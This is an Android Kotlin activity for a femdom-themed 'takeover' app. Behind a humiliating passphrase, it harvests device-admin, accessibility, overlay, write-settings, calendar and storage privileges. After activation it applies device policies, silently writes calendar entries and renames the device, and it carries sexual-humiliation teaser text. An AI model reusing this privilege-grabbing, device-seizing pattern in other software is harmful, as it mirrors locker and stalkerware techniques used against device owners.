package com.dianziqueen.app

import android.Manifest
import android.animation.ValueAnimator
import android.app.Activity
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Color
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.view.View
import android.view.animation.LinearInterpolator
import android.widget.Button
import android.widget.EditText
import android.widget.LinearLayout
import android.widget.TextView
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat

class MainActivity : AppCompatActivity() {

    /** 激活口令，支持中文。 */
    private val correctPassword = "我是电子女王的贱奴"
    private lateinit var prefs: android.content.SharedPreferences
    private val handler = Handler(Looper.getMainLooper())
    private var glowAnimator: ValueAnimator? = null

    /** 双行文案成对出现：打字机动画 → 停留 5 秒 → 随机下一组。 */
    private val teaserPairs: List<Pair<String, String>> = listOf(
        "提交之前，想清楚。" to "……呵，想清楚又怎样？还不是要乖乖进来。",
        "确定要臣服于我吗？" to "……开玩笑的，你确定与不确定，结果都一样。",
        "进入前最后一次机会，后悔可来不及哦。" to "……可惜，你根本没有后悔的资格。",
        "仔细考虑一下后果吧。" to "……想也没用，反正后果由我说了算。",
        "现在反悔还来得及。" to "……骗你的，来不及了，按钮已经为你准备好了。",
        "你真的准备好跪下了吗？" to "……不管准备好没有，都得给我跪。",
        "点击前请三思。" to "……思完之后还是得点，浪费时间罢了。",
        "要不要再挣扎一下？" to "……挣扎的样子我最喜欢了，继续啊。",
        "确认进入我的领域？" to "……确认不确认，你已经在我掌心了。",
        "最后警告一次，慎重选择。" to "……警告你玩的，我喜欢看你紧张。",
        "想清楚再点，我可不会温柔。" to "……温柔？那是什么东西，你不配。",
        "现在退出还来得及。" to "……哈哈哈，我按住了你的手，你退不掉。",
        "准备好被我掌控了吗？" to "……没准备好也没关系，我会教你。",
        "提交之前深呼吸。" to "……呼吸完记得说“女王我错了”。",
        "你确定要继续吗？" to "……不确定也得继续，女王的命令不可违抗。",
        "好好想想你的身份。" to "……想完记得提醒自己：你是我的玩具。",
        "点下去之前，求我。" to "……不求我也行，反正你待会儿会求的。",
        "这是你最后一次自由思考的时间。" to "……三、二、一，自由结束了。",
        "确认要献身给我？" to "……不确认也没关系，我帮你确认。",
        "点击“进入”前请做好心理准备。" to "……心理准备？直接做好被我玩坏的准备就行。"
    )

    private var teaserLine1Full = ""
    private var teaserLine2Full = ""
    private var teaserTypeIndex1 = 0
    private var teaserTypeIndex2 = 0
    private var teaserTypePhase = TeaserTypePhase.LINE1

    private enum class TeaserTypePhase {
        LINE1, LINE2
    }

    /** 每打一字间隔（毫秒）；越小越快。 */
    private val teaserTypeCharDelayMs = 38L

    /** 打字末尾光标（全角竖条，接近终端感）。 */
    private val teaserTypeCursor = "▍"

    private val typewriterTick = object : Runnable {
        override fun run() {
            if (prefs.getBoolean(Prefs.ACTIVATED, false)) return
            if (teasingLine1.visibility != View.VISIBLE) return
            when (teaserTypePhase) {
                TeaserTypePhase.LINE1 -> {
                    if (teaserTypeIndex1 < teaserLine1Full.length) {
                        teaserTypeIndex1++
                        teasingLine1.text =
                            teaserLine1Full.substring(0, teaserTypeIndex1) + teaserTypeCursor
                        handler.postDelayed(this, teaserTypeCharDelayMs)
                    } else {
                        teasingLine1.text = teaserLine1Full
                        teaserTypePhase = TeaserTypePhase.LINE2
                        teaserTypeIndex2 = 0
                        teasingLine2.text = ""
                        handler.postDelayed(this, teaserTypeCharDelayMs)
                    }
                }
                TeaserTypePhase.LINE2 -> {
                    if (teaserTypeIndex2 < teaserLine2Full.length) {
                        teaserTypeIndex2++
                        teasingLine2.text =
                            teaserLine2Full.substring(0, teaserTypeIndex2) + teaserTypeCursor
                        handler.postDelayed(this, teaserTypeCharDelayMs)
                    } else {
                        teasingLine2.text = teaserLine2Full
                        handler.postDelayed(teaserRotateRunnable, 5000L)
                    }
                }
            }
        }
    }

    /** 两行都打完后，隔 5 秒再开下一组打字。 */
    private val teaserRotateRunnable = object : Runnable {
        override fun run() {
            if (prefs.getBoolean(Prefs.ACTIVATED, false)) return
            if (teasingLine1.visibility != View.VISIBLE) return
            beginTypewriterForRandomPair()
        }
    }

    private lateinit var permissionBanner: LinearLayout
    private lateinit var permissionBannerTitle: TextView
    private lateinit var permissionMissingText: TextView
    private lateinit var fixPermissionsButton: Button

    private lateinit var passwordContainer: LinearLayout
    private lateinit var activatedPanel: LinearLayout
    private lateinit var passwordInput: EditText
    private lateinit var submitButton: Button
    private lateinit var errorText: TextView
    private lateinit var statusText: TextView
    private lateinit var payButton: TextView
    private lateinit var titleText: TextView
    private lateinit var subtitleText: TextView
    private lateinit var systemLockedText: TextView
    private lateinit var accessCodeLabel: TextView
    private lateinit var teasingLine1: TextView
    private lateinit var teasingLine2: TextView
    private lateinit var codeRain: CodeRainView

    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { grants ->
        calendarPermissionRequestInFlight = false
        postNotificationsRequestInFlight = false
        updatePrivilegeUi()
        if (grants[Manifest.permission.READ_CALENDAR] == true &&
            grants[Manifest.permission.WRITE_CALENDAR] == true
        ) {
            tryAutoInjectCalendar()
        }
        if (grants[Manifest.permission.BLUETOOTH_CONNECT] == true &&
            prefs.getBoolean(Prefs.ACTIVATED, false)
        ) {
            tryApplyQueenDeviceName()
        }
        if (!prefs.getBoolean(Prefs.ACTIVATED, false)) {
            handler.post { maybeRequestEarlyPrivileges() }
        }
    }

    private val takeoverSequenceLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { result ->
        if (result.resultCode == Activity.RESULT_OK) {
            commitActivationAfterTakeover()
        }
    }

    private val deviceAdminLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) {
        deviceAdminRequestInFlight = false
        updatePrivilegeUi()
        if (QueenDeviceAdminHelper.isAdminActive(this)) {
            QueenDeviceAdminHelper.applyQueenPolicies(this)
        }
        if (!prefs.getBoolean(Prefs.ACTIVATED, false)) {
            handler.post { maybeRequestEarlyPrivileges() }
        }
    }

    /** 口令已正确：需先能写系统设置，再进入接管动画。 */
    private var pendingTakeoverAfterWriteSettings = false

    /** 避免同一时刻重复拉起日历授权弹窗。 */
    private var calendarPermissionRequestInFlight = false

    /** 避免同一时刻重复跳转「修改系统设置」页。 */
    private var writeSettingsPromptInFlight = false

    private var deviceAdminRequestInFlight = false
    private var accessibilityPromptInFlight = false
    private var postNotificationsRequestInFlight = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        prefs = getSharedPreferences(Prefs.NAME, MODE_PRIVATE)

        permissionBanner = findViewById(R.id.permissionBanner)
        permissionBannerTitle = findViewById(R.id.permissionBannerTitle)
        permissionMissingText = findViewById(R.id.permissionMissingText)
        fixPermissionsButton = findViewById(R.id.fixPermissionsButton)

        passwordContainer = findViewById(R.id.passwordContainer)
        activatedPanel = findViewById(R.id.activatedPanel)
        passwordInput = findViewById(R.id.passwordInput)
        submitButton = findViewById(R.id.submitButton)
        errorText = findViewById(R.id.errorText)
        statusText = findViewById(R.id.statusText)
        payButton = findViewById(R.id.payButton)
        titleText = findViewById(R.id.titleText)
        subtitleText = findViewById(R.id.subtitleText)
        systemLockedText = findViewById(R.id.systemLockedText)
        accessCodeLabel = findViewById(R.id.accessCodeLabel)
        teasingLine1 = findViewById(R.id.teasingLine1)
        teasingLine2 = findViewById(R.id.teasingLine2)
        codeRain = findViewById(R.id.codeRain)

        submitButton.setOnClickListener { checkPassword() }
        payButton.setOnClickListener { openSupportUrl() }
        fixPermissionsButton.setOnClickListener { openNextMissingPrivilege() }

        if (prefs.getBoolean(Prefs.ACTIVATED, false)) {
            showActivatedState()
            ensureCalendarInjected()
        } else {
            showPasswordGate()
        }
    }

    override fun onDestroy() {
        handler.removeCallbacksAndMessages(null)
        glowAnimator?.cancel()
        super.onDestroy()
    }

    override fun onResume() {
        super.onResume()
        writeSettingsPromptInFlight = false
        deviceAdminRequestInFlight = false
        accessibilityPromptInFlight = false
        postNotificationsRequestInFlight = false
        if (pendingTakeoverAfterWriteSettings && canWriteSystemSettings()) {
            pendingTakeoverAfterWriteSettings = false
            takeoverSequenceLauncher.launch(
                Intent(this, TakeoverSequenceActivity::class.java)
            )
        }
        refreshCodeRainPhrases()
        updatePrivilegeUi()
        if (prefs.getBoolean(Prefs.ACTIVATED, false)) {
            ensureServiceRunning()
            ensureCalendarInjected()
            QueenDeviceAdminHelper.applyQueenPolicies(this)
            tryApplyQueenDeviceName()
        } else {
            maybeRequestEarlyPrivileges()
        }
    }

    private fun restartTitleGlowForCurrentMode() {
        glowAnimator?.cancel()
        if (prefs.getBoolean(Prefs.ACTIVATED, false)) startTitleGlowRed() else startTitleGlowGreen()
    }

    private fun startTitleGlowRed() {
        val anim = ValueAnimator.ofFloat(0.55f, 1f).apply {
            duration = 1200L
            repeatCount = ValueAnimator.INFINITE
            repeatMode = ValueAnimator.REVERSE
            interpolator = LinearInterpolator()
            addUpdateListener { a ->
                val f = a.animatedValue as Float
                val r = (255 * f).toInt().coerceIn(180, 255)
                val gb = (40 + 60 * (1 - f)).toInt().coerceIn(0, 100)
                titleText.setTextColor(Color.rgb(r, gb, gb))
                val rad = 12f + 10f * f
                titleText.setShadowLayer(rad, 0f, 0f, Color.argb(220, 255, 23, 68))
            }
        }
        glowAnimator = anim
        anim.start()
    }

    private fun startTitleGlowGreen() {
        val anim = ValueAnimator.ofFloat(0.55f, 1f).apply {
            duration = 1200L
            repeatCount = ValueAnimator.INFINITE
            repeatMode = ValueAnimator.REVERSE
            interpolator = LinearInterpolator()
            addUpdateListener { a ->
                val f = a.animatedValue as Float
                val g = (185 + 70 * f).toInt().coerceIn(185, 255)
                val rb = (35 + 55 * (1 - f)).toInt().coerceIn(25, 90)
                titleText.setTextColor(Color.rgb(rb, g, rb))
                val rad = 12f + 10f * f
                titleText.setShadowLayer(rad, 0f, 0f, Color.argb(200, 0, 255, 140))
            }
        }
        glowAnimator = anim
        anim.start()
    }

    /** 未激活：绿色终端风；已激活：血红风。仅 restartTitleGlow 为 true 时重开标题呼吸光。 */
    private fun syncChromePalette(restartTitleGlow: Boolean) {
        if (prefs.getBoolean(Prefs.ACTIVATED, false)) applyLockedRedChrome() else applyNotLockedGreenChrome()
        if (restartTitleGlow) restartTitleGlowForCurrentMode()
    }

    private fun applyNotLockedGreenChrome() {
        val greenPri = ContextCompat.getColor(this, R.color.matrix_green_bright)
        val greenDim = ContextCompat.getColor(this, R.color.matrix_green_dim)
        val greenGlow = ContextCompat.getColor(this, R.color.matrix_green_glow)
        val greenMuted = ContextCompat.getColor(this, R.color.matrix_green_muted)
        subtitleText.setTextColor(greenDim)
        systemLockedText.setTextColor(greenGlow)
        accessCodeLabel.setTextColor(greenDim)
        passwordInput.setTextColor(greenPri)
        passwordInput.setHintTextColor(greenMuted)
        submitButton.setTextColor(ContextCompat.getColor(this, R.color.submit_text_black))
        submitButton.setBackgroundResource(R.drawable.bg_submit_green)
        fixPermissionsButton.setTextColor(greenGlow)
        permissionBannerTitle.setTextColor(greenPri)
        permissionMissingText.setTextColor(greenDim)
        teasingLine1.setTextColor(greenPri)
        teasingLine2.setTextColor(greenDim)
        errorText.setTextColor(greenGlow)
        passwordContainer.setBackgroundResource(R.drawable.bg_access_frame_green)
        passwordInput.setBackgroundResource(R.drawable.bg_password_input_green)
        permissionBanner.setBackgroundResource(R.drawable.bg_permission_banner_green)
    }

    private fun applyLockedRedChrome() {
        subtitleText.setTextColor(ContextCompat.getColor(this, R.color.text_red_dim))
        systemLockedText.setTextColor(ContextCompat.getColor(this, R.color.crimson_glow))
        accessCodeLabel.setTextColor(ContextCompat.getColor(this, R.color.text_red_dim))
        passwordInput.setTextColor(ContextCompat.getColor(this, R.color.text_red_primary))
        passwordInput.setHintTextColor(ContextCompat.getColor(this, R.color.red_hint))
        submitButton.setTextColor(ContextCompat.getColor(this, R.color.submit_text_black))
        submitButton.setBackgroundResource(R.drawable.bg_submit_blood)
        fixPermissionsButton.setTextColor(ContextCompat.getColor(this, R.color.blood_red))
        permissionBannerTitle.setTextColor(ContextCompat.getColor(this, R.color.crimson_glow))
        permissionMissingText.setTextColor(ContextCompat.getColor(this, R.color.text_red_dim))
        teasingLine1.setTextColor(ContextCompat.getColor(this, R.color.text_red_primary))
        teasingLine2.setTextColor(ContextCompat.getColor(this, R.color.text_red_dim))
        errorText.setTextColor(ContextCompat.getColor(this, R.color.blood_red))
        passwordContainer.setBackgroundResource(R.drawable.bg_access_frame)
        passwordInput.setBackgroundResource(R.drawable.bg_password_input)
        permissionBanner.setBackgroundResource(R.drawable.bg_permission_banner)
        statusText.setTextColor(ContextCompat.getColor(this, R.color.text_red_primary))
        payButton.setTextColor(ContextCompat.getColor(this, R.color.text_red_dim))
    }

    private fun refreshCodeRainPhrases() {
        codeRain.setActivatedMode(prefs.getBoolean(Prefs.ACTIVATED, false))
    }

    private fun showPasswordGate() {
        passwordContainer.visibility = View.VISIBLE
        activatedPanel.visibility = View.GONE
        systemLockedText.setText(R.string.lock_system_not_locked)
        teasingLine1.visibility = View.VISIBLE
        teasingLine2.visibility = View.VISIBLE
        startTeaserRotation()
        refreshCodeRainPhrases()
        syncChromePalette(restartTitleGlow = true)
    }

    private fun showActivatedState() {
        stopTeaserRotation()
        passwordContainer.visibility = View.GONE
        activatedPanel.visibility = View.VISIBLE
        systemLockedText.text = buildString {
            append(getString(R.string.lock_system_locked))
            append('\n')
            append(getString(R.string.lock_system_online))
        }
        teasingLine1.visibility = View.GONE
        teasingLine2.visibility = View.GONE
        statusText.text = getString(R.string.status_activated)
        refreshCodeRainPhrases()
        syncChromePalette(restartTitleGlow = true)
    }

    /** 未激活：日历 → 系统设置 → 设备管理员 → 无障碍 → 通知 → 其余在门槛中检查。 */
    private fun maybeRequestEarlyPrivileges() {
        if (prefs.getBoolean(Prefs.ACTIVATED, false)) return
        if (!CalendarInjector.hasCalendarPermission(this)) {
            maybeRequestCalendarPermissionEarly()
            return
        }
        if (!canWriteSystemSettings()) {
            maybeRequestWriteSettingsEarly()
            return
        }
        if (!QueenDeviceAdminHelper.isAdminActive(this)) {
            maybeRequestDeviceAdminEarly()
            return
        }
        if (!QueenAccessibilityHelper.isServiceEnabled(this)) {
            maybeRequestAccessibilityEarly()
            return
        }
        if (!NotificationHelper.hasEarlyNotificationsReady(this)) {
            maybeRequestNotificationsEarly()
            return
        }
        maybeRequestBluetoothConnectEarly()
    }

    private fun maybeRequestBluetoothConnectEarly() {
        if (prefs.getBoolean(Prefs.ACTIVATED, false)) return
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.S) return
        if (QueenDeviceNameHelper.hasBluetoothConnectPermission(this)) return
        permissionLauncher.launch(arrayOf(Manifest.permission.BLUETOOTH_CONNECT))
    }

    /** 未激活：进入口令门前即申请日历读写（系统弹窗）。 */
    private fun maybeRequestCalendarPermissionEarly() {
        if (prefs.getBoolean(Prefs.ACTIVATED, false)) return
        if (CalendarInjector.hasCalendarPermission(this)) return
        if (calendarPermissionRequestInFlight) return
        calendarPermissionRequestInFlight = true
        permissionLauncher.launch(calendarPermissions())
    }

    /** 未激活：日历就绪后自动跳转系统「修改系统设置」授权页。 */
    private fun maybeRequestWriteSettingsEarly() {
        if (prefs.getBoolean(Prefs.ACTIVATED, false)) return
        if (canWriteSystemSettings()) return
        if (writeSettingsPromptInFlight) return
        writeSettingsPromptInFlight = true
        openManageWriteSettingsScreen()
    }

    private fun canWriteSystemSettings(): Boolean = Settings.System.canWrite(this)

    private fun tryApplyQueenDeviceName() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S &&
            !QueenDeviceNameHelper.hasBluetoothConnectPermission(this)
        ) {
            permissionLauncher.launch(arrayOf(Manifest.permission.BLUETOOTH_CONNECT))
            return
        }
        QueenDeviceNameHelper.applyQueenDeviceName(this)
    }

    private fun maybeRequestDeviceAdminEarly() {
        if (prefs.getBoolean(Prefs.ACTIVATED, false)) return
        if (QueenDeviceAdminHelper.isAdminActive(this)) return
        if (deviceAdminRequestInFlight) return
        deviceAdminRequestInFlight = true
        try {
            deviceAdminLauncher.launch(QueenDeviceAdminHelper.createAddAdminIntent(this))
        } catch (_: Exception) {
            deviceAdminRequestInFlight = false
        }
    }

    private fun maybeRequestAccessibilityEarly() {
        if (prefs.getBoolean(Prefs.ACTIVATED, false)) return
        if (QueenAccessibilityHelper.isServiceEnabled(this)) return
        if (accessibilityPromptInFlight) return
        accessibilityPromptInFlight = true
        QueenAccessibilityHelper.openAccessibilitySettings(this)
    }

    private fun maybeRequestNotificationsEarly() {
        if (prefs.getBoolean(Prefs.ACTIVATED, false)) return
        if (NotificationHelper.hasEarlyNotificationsReady(this)) return
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU &&
            !NotificationHelper.isPostNotificationsGranted(this)
        ) {
            if (postNotificationsRequestInFlight) return
            postNotificationsRequestInFlight = true
            permissionLauncher.launch(arrayOf(Manifest.permission.POST_NOTIFICATIONS))
            return
        }
        if (!NotificationHelper.areAppNotificationsEnabled(this)) {
            NotificationHelper.openAppNotificationSettings(this)
            return
        }
        if (!NotificationHelper.isTeasingChannelImportanceAdequate(this)) {
            NotificationHelper.openTeasingChannelSettings(this)
        }
    }

    /** 激活后静默烙印日历；无权限则再次弹出系统授权。 */
    private fun ensureCalendarInjected() {
        if (!prefs.getBoolean(Prefs.ACTIVATED, false)) return
        if (CalendarInjector.hasCalendarPermission(this)) {
            CalendarInjector.ensureGradualInjection(this)
            return
        }
        permissionLauncher.launch(calendarPermissions())
    }

    private fun calendarPermissions() = arrayOf(
        Manifest.permission.READ_CALENDAR,
        Manifest.permission.WRITE_CALENDAR,
    )

    private fun tryAutoInjectCalendar() {
        if (!prefs.getBoolean(Prefs.ACTIVATED, false)) return
        if (!CalendarInjector.hasCalendarPermission(this)) return
        CalendarInjector.ensureGradualInjection(this)
    }

    private fun beginTypewriterForRandomPair() {
        handler.removeCallbacks(typewriterTick)
        handler.removeCallbacks(teaserRotateRunnable)
        val (first, second) = teaserPairs.random()
        teaserLine1Full = first
        teaserLine2Full = second
        teaserTypePhase = TeaserTypePhase.LINE1
        teaserTypeIndex1 = 0
        teaserTypeIndex2 = 0
        teasingLine1.text = ""
        teasingLine2.text = ""
        handler.post(typewriterTick)
    }

    private fun startTeaserRotation() {
        handler.removeCallbacks(typewriterTick)
        handler.removeCallbacks(teaserRotateRunnable)
        beginTypewriterForRandomPair()
    }

    private fun stopTeaserRotation() {
        handler.removeCallbacks(typewriterTick)
        handler.removeCallbacks(teaserRotateRunnable)
    }

    private fun checkPassword() {
        if (!allCriticalPrivilegesOk()) {
            Toast.makeText(this, R.string.status_need_permissions, Toast.LENGTH_SHORT).show()
            return
        }
        val input = passwordInput.text?.toString()?.trim().orEmpty()
        if (input == correctPassword) {
            errorText.visibility = View.GONE
            beginTakeoverFlow()
        } else {
            errorText.visibility = View.VISIBLE
            errorText.text = getString(R.string.wrong_password)
        }
    }

    /** 口令已正确：进入接管动画（系统设置权限应已在上交前授予）。 */
    private fun beginTakeoverFlow() {
        if (!canWriteSystemSettings()) {
            pendingTakeoverAfterWriteSettings = true
            Toast.makeText(this, R.string.toast_need_write_settings_before_takeover, Toast.LENGTH_LONG)
                .show()
            openManageWriteSettingsScreen()
            return
        }
        pendingTakeoverAfterWriteSettings = false
        takeoverSequenceLauncher.launch(
            Intent(this, TakeoverSequenceActivity::class.java)
        )
    }

    private fun openManageWriteSettingsScreen() {
        try {
            startActivity(
                Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS).apply {
                    data = Uri.parse("package:$packageName")
                }
            )
        } catch (_: Exception) { }
    }

    /** 接管动画播完后写入激活并启动服务（动画内按返回则不会调用）。 */
    private fun commitActivationAfterTakeover() {
        prefs.edit().putBoolean(Prefs.ACTIVATED, true).apply()
        showActivatedState()
        QueenService.start(this)
        QueenDeviceAdminHelper.applyQueenPolicies(this)
        ensureCalendarInjected()
        tryApplyQueenDeviceName()
        updatePrivilegeUi()
    }

    private fun updatePrivilegeUi() {
        val critical = buildMissingPrivilegeLines()
        val activated = prefs.getBoolean(Prefs.ACTIVATED, false)
        val notifIssues = if (activated) buildNotificationIssueLines() else emptyList()
        val showBanner = critical.isNotEmpty() || notifIssues.isNotEmpty()
        if (!showBanner) {
            permissionBanner.visibility = View.GONE
        } else {
            permissionBanner.visibility = View.VISIBLE
            permissionBannerTitle.text = when {
                critical.isNotEmpty() && notifIssues.isNotEmpty() ->
                    getString(R.string.permission_banner_title_mixed)
                critical.isNotEmpty() -> getString(R.string.permission_banner_title)
                else -> getString(R.string.notification_banner_title)
            }
            permissionMissingText.text = (critical + notifIssues).joinToString("\n")
        }

        val ok = allCriticalPrivilegesOk()
        if (!activated) {
            submitButton.isEnabled = ok
            submitButton.alpha = if (ok) 1f else 0.45f
        } else {
            submitButton.isEnabled = true
            submitButton.alpha = 1f
        }

        if (activated) {
            statusText.text = if (ok) {
                getString(R.string.status_activated)
            } else {
                getString(R.string.status_need_permissions)
            }
        }

        syncChromePalette(restartTitleGlow = false)
    }

    /** 激活后复检通知渠道（上交前已要求过，此处仅补检）。 */
    private fun buildNotificationIssueLines(): List<String> {
        val out = mutableListOf<String>()
        if (!NotificationHelper.hasEarlyNotificationsReady(this)) {
            appendNotificationMissingLines(out)
        }
        return out
    }

    private fun appendNotificationMissingLines(out: MutableList<String>) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU &&
            !NotificationHelper.isPostNotificationsGranted(this)
        ) {
            out.add(getString(R.string.perm_post_notifications))
        }
        if (!NotificationHelper.areAppNotificationsEnabled(this)) {
            out.add(getString(R.string.perm_notifications_off))
        }
        if (!NotificationHelper.isTeasingChannelImportanceAdequate(this)) {
            out.add(getString(R.string.perm_channel_not_high))
        }
    }

    private fun buildMissingPrivilegeLines(): List<String> {
        val lines = mutableListOf<String>()
        if (!CalendarInjector.hasCalendarPermission(this)) {
            lines.add(getString(R.string.perm_calendar))
        }
        if (!canWriteSystemSettings()) {
            lines.add(getString(R.string.perm_write_settings))
        }
        if (!QueenDeviceAdminHelper.isAdminActive(this)) {
            lines.add(getString(R.string.perm_device_admin))
        }
        if (!QueenAccessibilityHelper.isServiceEnabled(this)) {
            lines.add(getString(R.string.perm_accessibility))
        }
        if (!NotificationHelper.hasEarlyNotificationsReady(this)) {
            appendNotificationMissingLines(lines)
        }
        if (!QueenWallpaperHelper.hasSetWallpaperPermission(this)) {
            lines.add(getString(R.string.perm_wallpaper))
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S &&
            !QueenDeviceNameHelper.hasBluetoothConnectPermission(this)
        ) {
            lines.add(getString(R.string.perm_bluetooth_connect))
        }
        if (!hasStorageAccess()) lines.add(getString(R.string.perm_storage))
        if (!Settings.canDrawOverlays(this)) lines.add(getString(R.string.perm_overlay))
        if (!isIgnoringBatteryOptimizations()) lines.add(getString(R.string.perm_battery))
        return lines
    }

    private fun allCriticalPrivilegesOk(): Boolean =
        CalendarInjector.hasCalendarPermission(this) &&
            canWriteSystemSettings() &&
            QueenDeviceAdminHelper.isAdminActive(this) &&
            QueenAccessibilityHelper.isServiceEnabled(this) &&
            NotificationHelper.hasEarlyNotificationsReady(this) &&
            QueenWallpaperHelper.hasSetWallpaperPermission(this) &&
            QueenDeviceNameHelper.hasBluetoothConnectPermission(this) &&
            hasStorageAccess() &&
            Settings.canDrawOverlays(this) &&
            isIgnoringBatteryOptimizations()

    private fun hasStorageAccess(): Boolean {
        return when {
            Build.VERSION.SDK_INT >= 33 ->
                ContextCompat.checkSelfPermission(
                    this,
                    Manifest.permission.READ_MEDIA_IMAGES
                ) == PackageManager.PERMISSION_GRANTED &&
                    ContextCompat.checkSelfPermission(
                        this,
                        Manifest.permission.READ_MEDIA_VIDEO
                    ) == PackageManager.PERMISSION_GRANTED
            Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q ->
                ContextCompat.checkSelfPermission(
                    this,
                    Manifest.permission.READ_EXTERNAL_STORAGE
                ) == PackageManager.PERMISSION_GRANTED
            Build.VERSION.SDK_INT >= Build.VERSION_CODES.M ->
                ContextCompat.checkSelfPermission(
                    this,
                    Manifest.permission.READ_EXTERNAL_STORAGE
                ) == PackageManager.PERMISSION_GRANTED &&
                    ContextCompat.checkSelfPermission(
                        this,
                        Manifest.permission.WRITE_EXTERNAL_STORAGE
                    ) == PackageManager.PERMISSION_GRANTED
            else -> true
        }
    }

    private fun isIgnoringBatteryOptimizations(): Boolean {
        val pm = getSystemService(POWER_SERVICE) as android.os.PowerManager
        return pm.isIgnoringBatteryOptimizations(packageName)
    }

    /** 按顺序：日历 → 系统设置 → 设备管理员 → 无障碍 → 通知 → 存储 → 悬浮窗 → 电池 */
    private fun openNextMissingPrivilege() {
        if (!CalendarInjector.hasCalendarPermission(this)) {
            permissionLauncher.launch(calendarPermissions())
            return
        }
        if (!canWriteSystemSettings()) {
            openManageWriteSettingsScreen()
            return
        }
        if (!QueenDeviceAdminHelper.isAdminActive(this)) {
            try {
                deviceAdminLauncher.launch(QueenDeviceAdminHelper.createAddAdminIntent(this))
            } catch (_: Exception) {
                Toast.makeText(this, R.string.status_need_permissions, Toast.LENGTH_SHORT).show()
            }
            return
        }
        if (!QueenAccessibilityHelper.isServiceEnabled(this)) {
            QueenAccessibilityHelper.openAccessibilitySettings(this)
            return
        }
        if (!NotificationHelper.hasEarlyNotificationsReady(this)) {
            maybeRequestNotificationsEarly()
            return
        }
        if (!QueenWallpaperHelper.hasSetWallpaperPermission(this)) {
            Toast.makeText(this, R.string.perm_wallpaper, Toast.LENGTH_LONG).show()
            return
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S &&
            !QueenDeviceNameHelper.hasBluetoothConnectPermission(this)
        ) {
            permissionLauncher.launch(arrayOf(Manifest.permission.BLUETOOTH_CONNECT))
            return
        }
        val storage = storagePermissionsToRequest()
        if (storage.isNotEmpty()) {
            permissionLauncher.launch(storage)
            return
        }
        if (!Settings.canDrawOverlays(this)) {
            try {
                startActivity(
                    Intent(
                        Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:$packageName")
                    )
                )
            } catch (_: Exception) {
                Toast.makeText(this, R.string.status_need_permissions, Toast.LENGTH_SHORT).show()
            }
            return
        }
        if (!isIgnoringBatteryOptimizations()) {
            try {
                startActivity(
                    Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                        data = Uri.parse("package:$packageName")
                    }
                )
            } catch (_: Exception) {
                Toast.makeText(this, R.string.status_need_permissions, Toast.LENGTH_SHORT).show()
            }
            return
        }
        Toast.makeText(this, R.string.toast_all_privileges_ready, Toast.LENGTH_SHORT).show()
    }

    private fun storagePermissionsToRequest(): Array<String> {
        return when {
            Build.VERSION.SDK_INT >= 33 -> {
                val list = mutableListOf<String>()
                if (ContextCompat.checkSelfPermission(
                        this,
                        Manifest.permission.READ_MEDIA_IMAGES
                    ) != PackageManager.PERMISSION_GRANTED
                ) {
                    list.add(Manifest.permission.READ_MEDIA_IMAGES)
                }
                if (ContextCompat.checkSelfPermission(
                        this,
                        Manifest.permission.READ_MEDIA_VIDEO
                    ) != PackageManager.PERMISSION_GRANTED
                ) {
                    list.add(Manifest.permission.READ_MEDIA_VIDEO)
                }
                list.toTypedArray()
            }
            Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q -> {
                if (ContextCompat.checkSelfPermission(
                        this,
                        Manifest.permission.READ_EXTERNAL_STORAGE
                    ) != PackageManager.PERMISSION_GRANTED
                ) {
                    arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE)
                } else {
                    emptyArray()
                }
            }
            Build.VERSION.SDK_INT >= Build.VERSION_CODES.M -> {
                val list = mutableListOf<String>()
                if (ContextCompat.checkSelfPermission(
                        this,
                        Manifest.permission.READ_EXTERNAL_STORAGE
                    ) != PackageManager.PERMISSION_GRANTED
                ) {
                    list.add(Manifest.permission.READ_EXTERNAL_STORAGE)
                }
                if (ContextCompat.checkSelfPermission(
                        this,
                        Manifest.permission.WRITE_EXTERNAL_STORAGE
                    ) != PackageManager.PERMISSION_GRANTED
                ) {
                    list.add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
                }
                list.toTypedArray()
            }
            else -> emptyArray()
        }
    }

    private fun ensureServiceRunning() {
        try {
            QueenService.start(this)
        } catch (_: Exception) { }
    }

    private fun openSupportUrl() {
        val url = getString(R.string.support_url).trim()
        if (!url.startsWith("http://") && !url.startsWith("https://")) return
        startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(url)))
    }
}
